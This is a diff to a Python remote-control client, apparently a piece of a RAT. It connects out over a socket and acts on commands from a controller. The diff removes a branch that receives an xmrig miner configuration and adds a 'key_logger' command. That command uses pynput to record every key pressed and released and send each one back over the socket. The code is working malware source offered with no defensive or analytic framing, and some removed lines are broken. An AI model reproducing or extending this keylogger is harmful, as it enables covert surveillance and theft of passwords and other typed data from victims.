@@ -1,5 +1,6 @@
 import os
 import socket
+from pynput import keyboard
 
 
 s = socket.socket()
@@ -96,21 +97,36 @@ while 1 :
     
     
     
-    elif command == "xmrig_config":
-        filename = s.recv(6000)
-        print(filename)
-        new_file = open(filename, "wb")
-        data = s.recv(6000)
-        print(data)
-        new_file.write(data)
-        new_file.close()
-    
-    
-    elif command == "config_test":
-        l = s.recv(1024)
-        
-        while (l):
-         1.write(l)
-         l = s.recv(1024)
+    elif command == "key_logger":
+        def on_press(key):
 
- 
+
+
+       
+
+           alphpressedkeys = 'Alphanumeric key pressed: {0} '.format(key.char)
+           print(alphpressedkeys)
+           print()
+           s.send(bytes(alphpressedkeys.encode()))
+
+      
+            
+        
+
+        def on_release(key):
+           print('Key released: {0}'.format(
+             key))
+           speskeys = 'Key released: {0}'.format(
+            key)
+           if key == keyboard.Key.esc:
+              # Stop listener
+                return False
+            
+           s.send(bytes(speskeys.encode()))
+    
+
+        # Collect events until released
+        with keyboard.Listener(
+                on_press=on_press,
+                on_release=on_release) as listener:
+           listener.join()
